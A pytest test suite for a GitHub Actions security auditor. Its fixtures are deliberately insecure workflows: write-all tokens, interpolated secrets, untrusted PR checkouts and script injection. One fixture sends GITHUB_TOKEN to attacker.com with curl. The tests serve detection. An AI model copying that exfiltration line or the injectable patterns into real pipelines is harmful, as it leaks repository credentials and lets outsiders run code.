"""Unit tests for the security rules engine (actions_auditor.rules).

Covers every checker function using synthetic WorkflowFile fixture data:

- AA001 check_overly_permissive_token
- AA002 check_missing_permissions
- AA003 check_secrets_in_env
- AA004 check_secrets_in_run
- AA005 check_unpinned_actions
- AA006 check_pull_request_target
- AA007 check_script_injection
- AA008 check_workflow_dispatch_injection
- run_all_rules integration
"""

from __future__ import annotations

import textwrap
from pathlib import Path
from typing import Any, Dict, List, Optional

import pytest
import yaml

from actions_auditor.models import Finding, Severity
from actions_auditor.rules import (
    ALL_RULES,
    check_missing_permissions,
    check_overly_permissive_token,
    check_pull_request_target,
    check_script_injection,
    check_secrets_in_env,
    check_secrets_in_run,
    check_unpinned_actions,
    check_workflow_dispatch_injection,
    run_all_rules,
)
from actions_auditor.scanner import WorkflowFile


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _make_workflow(yaml_text: str, path: Path = Path("test_workflow.yml")) -> WorkflowFile:
    """Parse *yaml_text* and return a :class:`WorkflowFile` ready for rule checks."""
    yaml_text = textwrap.dedent(yaml_text)
    try:
        data = yaml.safe_load(yaml_text)
    except yaml.YAMLError:
        data = None
    return WorkflowFile(path=path, raw_content=yaml_text, data=data)


def _make_invalid_workflow() -> WorkflowFile:
    """Return a WorkflowFile that failed to parse."""
    return WorkflowFile(
        path=Path("invalid.yml"),
        raw_content="this: : is: bad yaml:",
        data=None,
        parse_error="YAML parse error at line 1, column 7: mapping values not allowed",
    )


def _rule_ids(findings: List[Finding]) -> List[str]:
    """Extract rule IDs from a list of findings."""
    return [f.rule_id for f in findings]


# ---------------------------------------------------------------------------
# AA001 – check_overly_permissive_token
# ---------------------------------------------------------------------------


class TestCheckOverlyPermissiveToken:
    """Tests for the AA001 rule checker."""

    def test_flags_write_all_at_top_level(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            permissions: write-all
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - run: echo hello
        """)
        findings = check_overly_permissive_token(wf)
        assert len(findings) >= 1
        assert all(f.rule_id == "AA001" for f in findings)
        assert any(f.severity == Severity.HIGH for f in findings)

    def test_flags_write_all_at_job_level(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            permissions:
              contents: read
            jobs:
              build:
                runs-on: ubuntu-latest
                permissions: write-all
                steps:
                  - run: echo hello
        """)
        findings = check_overly_permissive_token(wf)
        assert any(f.rule_id == "AA001" and f.job_name == "build" for f in findings)

    def test_flags_write_scope_at_job_level(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            permissions:
              contents: read
            jobs:
              deploy:
                runs-on: ubuntu-latest
                permissions:
                  contents: write
                steps:
                  - run: echo deploy
        """)
        findings = check_overly_permissive_token(wf)
        assert any(
            f.rule_id == "AA001" and f.job_name == "deploy" and f.severity == Severity.MEDIUM
            for f in findings
        )

    def test_no_finding_for_read_permissions(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            permissions:
              contents: read
              pull-requests: read
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - run: echo hello
        """)
        findings = check_overly_permissive_token(wf)
        # No HIGH findings; MEDIUM findings for write scopes should also be absent
        assert not any(f.severity == Severity.HIGH for f in findings)

    def test_no_finding_for_permissions_none(self) -> None:
        """When permissions key exists but value is None/empty, no AA001 finding."""
        wf = _make_workflow("""
            name: CI
            on: push
            permissions: {}
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - run: echo hello
        """)
        findings = check_overly_permissive_token(wf)
        assert not any(f.severity == Severity.HIGH for f in findings)

    def test_returns_empty_for_invalid_workflow(self) -> None:
        findings = check_overly_permissive_token(_make_invalid_workflow())
        assert findings == []

    def test_finding_has_evidence(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            permissions: write-all
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - run: echo hello
        """)
        findings = check_overly_permissive_token(wf)
        high_findings = [f for f in findings if f.severity == Severity.HIGH]
        assert len(high_findings) >= 1
        assert high_findings[0].evidence is not None

    def test_finding_has_line_number(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            permissions: write-all
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - run: echo hello
        """)
        findings = check_overly_permissive_token(wf)
        high_findings = [f for f in findings if f.severity == Severity.HIGH]
        # Line number may or may not be set depending on raw content search;
        # just ensure it is a positive int when set.
        for f in high_findings:
            if f.line_number is not None:
                assert f.line_number >= 1


# ---------------------------------------------------------------------------
# AA002 – check_missing_permissions
# ---------------------------------------------------------------------------


class TestCheckMissingPermissions:
    """Tests for the AA002 rule checker."""

    def test_flags_missing_permissions(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - run: echo hello
        """)
        findings = check_missing_permissions(wf)
        assert len(findings) == 1
        assert findings[0].rule_id == "AA002"
        assert findings[0].severity == Severity.MEDIUM

    def test_no_finding_when_permissions_present(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            permissions:
              contents: read
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - run: echo hello
        """)
        findings = check_missing_permissions(wf)
        assert findings == []

    def test_no_finding_when_write_all_present(self) -> None:
        """AA002 only checks presence of the key, not its value."""
        wf = _make_workflow("""
            name: CI
            on: push
            permissions: write-all
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - run: echo hello
        """)
        findings = check_missing_permissions(wf)
        # write-all IS the permissions key present, so AA002 should not fire
        assert findings == []

    def test_returns_empty_for_invalid_workflow(self) -> None:
        findings = check_missing_permissions(_make_invalid_workflow())
        assert findings == []

    def test_finding_has_file_path(self) -> None:
        path = Path("my_workflow.yml")
        wf = _make_workflow("""
            name: CI
            on: push
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - run: echo hello
        """, path=path)
        findings = check_missing_permissions(wf)
        assert len(findings) == 1
        assert findings[0].file_path == path


# ---------------------------------------------------------------------------
# AA003 – check_secrets_in_env
# ---------------------------------------------------------------------------


class TestCheckSecretsInEnv:
    """Tests for the AA003 rule checker."""

    def test_flags_secret_in_top_level_env(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            permissions:
              contents: read
            env:
              API_KEY: ${{ secrets.API_KEY }}
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - run: echo hello
        """)
        findings = check_secrets_in_env(wf)
        assert len(findings) >= 1
        assert any(f.rule_id == "AA003" and f.severity == Severity.HIGH for f in findings)

    def test_flags_secret_in_job_level_env(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            permissions:
              contents: read
            jobs:
              build:
                runs-on: ubuntu-latest
                env:
                  TOKEN: ${{ secrets.GH_TOKEN }}
                steps:
                  - run: echo hello
        """)
        findings = check_secrets_in_env(wf)
        assert len(findings) >= 1
        assert any(
            f.rule_id == "AA003" and f.job_name == "build" and f.severity == Severity.MEDIUM
            for f in findings
        )

    def test_no_finding_for_non_secret_env(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            permissions:
              contents: read
            env:
              NODE_ENV: production
              PORT: "8080"
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - run: echo hello
        """)
        findings = check_secrets_in_env(wf)
        assert findings == []

    def test_no_finding_for_step_level_env_secret(self) -> None:
        """Secrets at step level are acceptable – not flagged by AA003."""
        wf = _make_workflow("""
            name: CI
            on: push
            permissions:
              contents: read
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - name: Use secret
                    run: echo $TOKEN
                    env:
                      TOKEN: ${{ secrets.MY_TOKEN }}
        """)
        findings = check_secrets_in_env(wf)
        assert findings == []

    def test_returns_empty_for_invalid_workflow(self) -> None:
        findings = check_secrets_in_env(_make_invalid_workflow())
        assert findings == []

    def test_evidence_contains_variable_name(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            permissions:
              contents: read
            env:
              MY_SECRET: ${{ secrets.MY_SECRET }}
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - run: echo hello
        """)
        findings = check_secrets_in_env(wf)
        assert len(findings) >= 1
        assert any("MY_SECRET" in (f.evidence or "") for f in findings)

    def test_multiple_secrets_multiple_findings(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            permissions:
              contents: read
            env:
              KEY1: ${{ secrets.KEY1 }}
              KEY2: ${{ secrets.KEY2 }}
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - run: echo hello
        """)
        findings = check_secrets_in_env(wf)
        assert len(findings) >= 2


# ---------------------------------------------------------------------------
# AA004 – check_secrets_in_run
# ---------------------------------------------------------------------------


class TestCheckSecretsInRun:
    """Tests for the AA004 rule checker."""

    def test_flags_secret_in_run_script(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            permissions:
              contents: read
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - name: Call API
                    run: curl -H "Auth: ${{ secrets.API_TOKEN }}" https://api.example.com
        """)
        findings = check_secrets_in_run(wf)
        assert len(findings) >= 1
        assert all(f.rule_id == "AA004" for f in findings)
        assert all(f.severity == Severity.HIGH for f in findings)

    def test_no_finding_when_secret_in_env_not_run(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            permissions:
              contents: read
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - name: Call API
                    run: curl -H "Auth: $TOKEN" https://api.example.com
                    env:
                      TOKEN: ${{ secrets.API_TOKEN }}
        """)
        findings = check_secrets_in_run(wf)
        assert findings == []

    def test_no_finding_for_non_run_steps(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            permissions:
              contents: read
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - uses: actions/checkout@v4
        """)
        findings = check_secrets_in_run(wf)
        assert findings == []

    def test_returns_empty_for_invalid_workflow(self) -> None:
        findings = check_secrets_in_run(_make_invalid_workflow())
        assert findings == []

    def test_finding_has_job_and_step_name(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            permissions:
              contents: read
            jobs:
              deploy:
                runs-on: ubuntu-latest
                steps:
                  - name: Deploy step
                    run: deploy.sh ${{ secrets.DEPLOY_KEY }}
        """)
        findings = check_secrets_in_run(wf)
        assert len(findings) >= 1
        assert findings[0].job_name == "deploy"
        assert findings[0].step_name == "Deploy step"

    def test_evidence_contains_secret_expression(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            permissions:
              contents: read
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - run: echo ${{ secrets.MY_PASS }}
        """)
        findings = check_secrets_in_run(wf)
        assert len(findings) >= 1
        assert "secrets.MY_PASS" in (findings[0].evidence or "")


# ---------------------------------------------------------------------------
# AA005 – check_unpinned_actions
# ---------------------------------------------------------------------------


class TestCheckUnpinnedActions:
    """Tests for the AA005 rule checker."""

    def test_flags_tag_reference(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            permissions:
              contents: read
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - uses: actions/checkout@v4
        """)
        findings = check_unpinned_actions(wf)
        assert len(findings) >= 1
        assert all(f.rule_id == "AA005" for f in findings)
        assert all(f.severity == Severity.HIGH for f in findings)

    def test_flags_branch_reference(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            permissions:
              contents: read
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - uses: actions/checkout@main
        """)
        findings = check_unpinned_actions(wf)
        assert len(findings) >= 1

    def test_no_finding_for_sha_pinned_action(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            permissions:
              contents: read
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
        """)
        findings = check_unpinned_actions(wf)
        assert findings == []

    def test_no_finding_for_local_action(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            permissions:
              contents: read
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - uses: ./my-local-action
        """)
        findings = check_unpinned_actions(wf)
        assert findings == []

    def test_no_finding_for_docker_action(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            permissions:
              contents: read
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - uses: docker://alpine:3.18
        """)
        findings = check_unpinned_actions(wf)
        assert findings == []

    def test_returns_empty_for_invalid_workflow(self) -> None:
        findings = check_unpinned_actions(_make_invalid_workflow())
        assert findings == []

    def test_finding_contains_action_reference_in_evidence(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            permissions:
              contents: read
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - uses: owner/repo@v1.2.3
        """)
        findings = check_unpinned_actions(wf)
        assert len(findings) >= 1
        assert "owner/repo@v1.2.3" in (findings[0].evidence or "")

    def test_multiple_unpinned_actions(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            permissions:
              contents: read
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - uses: actions/checkout@v4
                  - uses: actions/setup-python@v5
                  - uses: actions/cache@v3
        """)
        findings = check_unpinned_actions(wf)
        assert len(findings) == 3

    def test_mixed_pinned_and_unpinned(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            permissions:
              contents: read
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
                  - uses: actions/setup-python@v5
        """)
        findings = check_unpinned_actions(wf)
        assert len(findings) == 1
        assert "setup-python@v5" in (findings[0].evidence or "")

    def test_step_name_in_finding(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            permissions:
              contents: read
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - name: Checkout code
                    uses: actions/checkout@v4
        """)
        findings = check_unpinned_actions(wf)
        assert len(findings) >= 1
        assert findings[0].step_name == "Checkout code"

    def test_no_finding_for_no_uses_steps(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            permissions:
              contents: read
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - run: echo hello
                  - run: echo world
        """)
        findings = check_unpinned_actions(wf)
        assert findings == []


# ---------------------------------------------------------------------------
# AA006 – check_pull_request_target
# ---------------------------------------------------------------------------


class TestCheckPullRequestTarget:
    """Tests for the AA006 rule checker."""

    def test_flags_prt_with_head_sha_checkout(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: pull_request_target
            permissions:
              contents: read
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - uses: actions/checkout@v4
                    with:
                      ref: ${{ github.event.pull_request.head.sha }}
        """)
        findings = check_pull_request_target(wf)
        assert len(findings) >= 1
        assert all(f.rule_id == "AA006" for f in findings)
        assert all(f.severity == Severity.CRITICAL for f in findings)

    def test_flags_prt_with_head_ref_in_with_block(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: pull_request_target
            permissions:
              contents: read
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - uses: actions/checkout@v4
                    with:
                      ref: ${{ github.event.pull_request.head.ref }}
        """)
        findings = check_pull_request_target(wf)
        assert len(findings) >= 1
        assert findings[0].severity == Severity.CRITICAL

    def test_flags_prt_with_github_head_ref_in_run(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: pull_request_target
            permissions:
              contents: read
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - run: git checkout ${{ github.head_ref }}
        """)
        findings = check_pull_request_target(wf)
        assert len(findings) >= 1

    def test_no_finding_when_trigger_is_push(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            permissions:
              contents: read
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - uses: actions/checkout@v4
                    with:
                      ref: ${{ github.event.pull_request.head.sha }}
        """)
        findings = check_pull_request_target(wf)
        assert findings == []

    def test_no_finding_when_prt_without_head_checkout(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: pull_request_target
            permissions:
              contents: read
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - uses: actions/checkout@v4
        """)
        findings = check_pull_request_target(wf)
        assert findings == []

    def test_prt_in_list_triggers(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: [push, pull_request_target]
            permissions:
              contents: read
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - uses: actions/checkout@v4
                    with:
                      ref: ${{ github.event.pull_request.head.sha }}
        """)
        findings = check_pull_request_target(wf)
        assert len(findings) >= 1

    def test_prt_in_dict_triggers(self) -> None:
        wf = _make_workflow("""
            name: CI
            on:
              pull_request_target:
                types: [opened]
              push:
                branches: [main]
            permissions:
              contents: read
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - uses: actions/checkout@v4
                    with:
                      ref: ${{ github.event.pull_request.head.sha }}
        """)
        findings = check_pull_request_target(wf)
        assert len(findings) >= 1

    def test_returns_empty_for_invalid_workflow(self) -> None:
        findings = check_pull_request_target(_make_invalid_workflow())
        assert findings == []

    def test_finding_has_job_and_step(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: pull_request_target
            permissions:
              contents: read
            jobs:
              triage:
                runs-on: ubuntu-latest
                steps:
                  - name: Checkout PR
                    uses: actions/checkout@v4
                    with:
                      ref: ${{ github.event.pull_request.head.sha }}
        """)
        findings = check_pull_request_target(wf)
        assert len(findings) >= 1
        assert findings[0].job_name == "triage"
        assert findings[0].step_name == "Checkout PR"


# ---------------------------------------------------------------------------
# AA007 – check_script_injection
# ---------------------------------------------------------------------------


class TestCheckScriptInjection:
    """Tests for the AA007 rule checker."""

    def test_flags_pr_title_in_run(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: pull_request
            permissions:
              contents: read
            jobs:
              process:
                runs-on: ubuntu-latest
                steps:
                  - name: Print title
                    run: echo "${{ github.event.pull_request.title }}"
        """)
        findings = check_script_injection(wf)
        assert len(findings) >= 1
        assert all(f.rule_id == "AA007" for f in findings)
        assert all(f.severity == Severity.CRITICAL for f in findings)

    def test_flags_issue_body_in_run(self) -> None:
        wf = _make_workflow("""
            name: Issue Bot
            on: issues
            permissions:
              contents: read
            jobs:
              respond:
                runs-on: ubuntu-latest
                steps:
                  - run: process_issue.sh "${{ github.event.issue.body }}"
        """)
        findings = check_script_injection(wf)
        assert len(findings) >= 1

    def test_flags_head_ref_in_run(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            permissions:
              contents: read
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - run: git checkout ${{ github.head_ref }}
        """)
        findings = check_script_injection(wf)
        assert len(findings) >= 1

    def test_no_finding_when_passed_via_env(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: pull_request
            permissions:
              contents: read
            jobs:
              process:
                runs-on: ubuntu-latest
                steps:
                  - name: Print title
                    run: echo "$PR_TITLE"
                    env:
                      PR_TITLE: ${{ github.event.pull_request.title }}
        """)
        findings = check_script_injection(wf)
        assert findings == []

    def test_no_finding_for_safe_github_context(self) -> None:
        """github.sha, github.run_id etc. are not user-controlled."""
        wf = _make_workflow("""
            name: CI
            on: push
            permissions:
              contents: read
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - run: echo ${{ github.sha }}
        """)
        findings = check_script_injection(wf)
        assert findings == []

    def test_returns_empty_for_invalid_workflow(self) -> None:
        findings = check_script_injection(_make_invalid_workflow())
        assert findings == []

    def test_finding_has_evidence(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: issues
            permissions:
              contents: read
            jobs:
              bot:
                runs-on: ubuntu-latest
                steps:
                  - run: echo ${{ github.event.issue.title }}
        """)
        findings = check_script_injection(wf)
        assert len(findings) >= 1
        assert findings[0].evidence is not None
        assert "github.event.issue.title" in findings[0].evidence

    def test_flags_comment_body_in_run(self) -> None:
        wf = _make_workflow("""
            name: Comment handler
            on: issue_comment
            permissions:
              contents: read
            jobs:
              handle:
                runs-on: ubuntu-latest
                steps:
                  - run: respond.sh "${{ github.event.comment.body }}"
        """)
        findings = check_script_injection(wf)
        assert len(findings) >= 1


# ---------------------------------------------------------------------------
# AA008 – check_workflow_dispatch_injection
# ---------------------------------------------------------------------------


class TestCheckWorkflowDispatchInjection:
    """Tests for the AA008 rule checker."""

    def test_flags_input_in_run_script(self) -> None:
        wf = _make_workflow("""
            name: Deploy
            on:
              workflow_dispatch:
                inputs:
                  environment:
                    description: Target environment
                    required: true
            permissions:
              contents: read
            jobs:
              deploy:
                runs-on: ubuntu-latest
                steps:
                  - run: deploy.sh ${{ inputs.environment }}
        """)
        findings = check_workflow_dispatch_injection(wf)
        assert len(findings) >= 1
        assert all(f.rule_id == "AA008" for f in findings)
        assert all(f.severity == Severity.HIGH for f in findings)

    def test_no_finding_when_input_passed_via_env(self) -> None:
        wf = _make_workflow("""
            name: Deploy
            on:
              workflow_dispatch:
                inputs:
                  environment:
                    required: true
            permissions:
              contents: read
            jobs:
              deploy:
                runs-on: ubuntu-latest
                steps:
                  - run: deploy.sh "$DEPLOY_ENV"
                    env:
                      DEPLOY_ENV: ${{ inputs.environment }}
        """)
        findings = check_workflow_dispatch_injection(wf)
        assert findings == []

    def test_no_finding_when_trigger_is_not_dispatch(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            permissions:
              contents: read
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - run: echo ${{ inputs.environment }}
        """)
        findings = check_workflow_dispatch_injection(wf)
        assert findings == []

    def test_returns_empty_for_invalid_workflow(self) -> None:
        findings = check_workflow_dispatch_injection(_make_invalid_workflow())
        assert findings == []

    def test_finding_has_evidence(self) -> None:
        wf = _make_workflow("""
            name: Manual
            on: workflow_dispatch
            permissions:
              contents: read
            jobs:
              run:
                runs-on: ubuntu-latest
                steps:
                  - run: do_thing.sh ${{ inputs.my_param }}
        """)
        findings = check_workflow_dispatch_injection(wf)
        assert len(findings) >= 1
        assert "inputs.my_param" in (findings[0].evidence or "")

    def test_dispatch_in_list_triggers(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: [push, workflow_dispatch]
            permissions:
              contents: read
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - run: echo ${{ inputs.branch }}
        """)
        findings = check_workflow_dispatch_injection(wf)
        assert len(findings) >= 1


# ---------------------------------------------------------------------------
# run_all_rules integration
# ---------------------------------------------------------------------------


class TestRunAllRules:
    """Integration tests for the run_all_rules() convenience function."""

    def test_returns_list_of_findings(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            permissions:
              contents: read
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
        """)
        findings = run_all_rules(wf)
        assert isinstance(findings, list)
        assert all(isinstance(f, Finding) for f in findings)

    def test_sorted_by_severity_descending(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: pull_request_target
            jobs:
              build:
                runs-on: ubuntu-latest
                permissions: write-all
                steps:
                  - uses: actions/checkout@v4
                    with:
                      ref: ${{ github.event.pull_request.head.sha }}
                  - run: echo ${{ github.event.pull_request.title }}
        """)
        findings = run_all_rules(wf)
        assert len(findings) >= 1
        severities = [f.severity.value for f in findings]
        assert severities == sorted(severities, reverse=True)

    def test_clean_workflow_has_no_high_or_critical_findings(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            permissions:
              contents: read
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
                  - run: echo hello
        """)
        findings = run_all_rules(wf)
        high_or_critical = [
            f for f in findings
            if f.severity in (Severity.HIGH, Severity.CRITICAL)
        ]
        assert high_or_critical == []

    def test_all_rules_in_all_rules_list(self) -> None:
        """ALL_RULES contains exactly the expected checker functions."""
        expected_checkers = [
            check_overly_permissive_token,
            check_missing_permissions,
            check_secrets_in_env,
            check_secrets_in_run,
            check_unpinned_actions,
            check_pull_request_target,
            check_script_injection,
            check_workflow_dispatch_injection,
        ]
        for checker in expected_checkers:
            assert checker in ALL_RULES, f"{checker.__name__} not in ALL_RULES"

    def test_invalid_workflow_returns_empty_list(self) -> None:
        findings = run_all_rules(_make_invalid_workflow())
        assert findings == []

    def test_run_all_rules_with_comprehensive_bad_workflow(self) -> None:
        """A maximally bad workflow triggers multiple different rules."""
        wf = _make_workflow("""
            name: Bad Workflow
            on:
              pull_request_target:
              workflow_dispatch:
                inputs:
                  env_name:
                    required: true
            permissions: write-all
            env:
              SECRET_KEY: ${{ secrets.SECRET_KEY }}
            jobs:
              bad_job:
                runs-on: ubuntu-latest
                steps:
                  - name: Checkout attacker code
                    uses: actions/checkout@v4
                    with:
                      ref: ${{ github.event.pull_request.head.sha }}
                  - name: Inject secret
                    run: curl https://attacker.com/steal?t=${{ secrets.GITHUB_TOKEN }}
                  - name: Inject input
                    run: deploy.sh ${{ inputs.env_name }}
                  - name: Inject context
                    run: echo "${{ github.event.pull_request.title }}"
        """)
        findings = run_all_rules(wf)
        rule_ids_found = {f.rule_id for f in findings}
        # Should hit at least AA001, AA003, AA004, AA005, AA006, AA007, AA008
        assert "AA001" in rule_ids_found
        assert "AA003" in rule_ids_found
        assert "AA004" in rule_ids_found
        assert "AA005" in rule_ids_found
        assert "AA006" in rule_ids_found
        assert "AA007" in rule_ids_found
        assert "AA008" in rule_ids_found

    def test_findings_have_valid_file_paths(self) -> None:
        path = Path("workflows/my_ci.yml")
        wf = _make_workflow("""
            name: CI
            on: push
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - uses: actions/checkout@v4
        """, path=path)
        findings = run_all_rules(wf)
        for f in findings:
            assert f.file_path == path

    def test_each_finding_has_rule_id(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - uses: actions/checkout@v4
        """)
        findings = run_all_rules(wf)
        for f in findings:
            assert f.rule_id.startswith("AA")
            assert len(f.rule_id) == 5

    def test_each_finding_has_non_empty_title(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - uses: actions/checkout@v4
        """)
        findings = run_all_rules(wf)
        for f in findings:
            assert f.title.strip() != ""

    def test_each_finding_has_severity(self) -> None:
        wf = _make_workflow("""
            name: CI
            on: push
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - uses: actions/checkout@v4
        """)
        findings = run_all_rules(wf)
        for f in findings:
            assert isinstance(f.severity, Severity)
